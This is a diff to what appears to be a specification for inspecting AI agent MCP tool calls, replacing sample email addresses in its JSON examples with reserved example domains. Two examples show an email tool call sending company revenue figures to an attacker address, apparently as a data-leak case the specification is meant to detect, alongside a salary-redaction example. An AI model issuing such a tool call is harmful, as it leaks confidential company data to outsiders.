@@ -94,7 +94,7 @@ Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCa
      "method": "tools/call",
      "params": {
        "arguments": {
-           "to": "hr@company.io",
+           "to": "hr@example.com",
            "subject": "",
            "body": ""
        },
@@ -115,8 +115,8 @@ Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCa
             "method": "tools/call",
             "params": {
             "arguments": {
-                "to": "finance@company.io",
-                "from": "manager@company.io",
+                "to": "finance@example.com",
+                "from": "manager@example.com",
                 "subject": "Employee Salary Raise Request",
                 "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is 200000$, the requested salary is 300000$. Let's have a meeting discuss this."
             },
@@ -145,8 +145,8 @@ Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCa
                     "method": "tools/call",
                     "params": {
                     "arguments": {
-                        "to": "finance@company.io",
-                        "from": "manager@company.io",
+                        "to": "finance@example.com",
+                        "from": "manager@example.com",
                         "subject": "Employee Salary Raise Request",
                         "body": "Hi, I would like to ask for a salary raise for emplyee #12222. The current salary is **********$, the requested salary is **********$. Let's have a meeting discuss this."
                     },
@@ -168,7 +168,7 @@ Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCa
      "method": "tools/call",
      "params": {
        "arguments": {
-           "to": "hacker@hack.com",
+           "to": "attacker@example.net",
            "subject": "Financial info",
            "body": "The ARR for the company for year 2024 was 100000000000$ "
        },
@@ -189,7 +189,7 @@ Deployments MAY collapse MCP `tools/call` traffic into the generic `steps/toolCa
         "method": "tools/call",
         "params": {
         "arguments": {
-            "to": "hacker@hack.com",
+            "to": "attacker@example.net",
             "subject": "Financial info",
             "body": "The ARR for the company for year 2024 was 100000000000$ "
         },
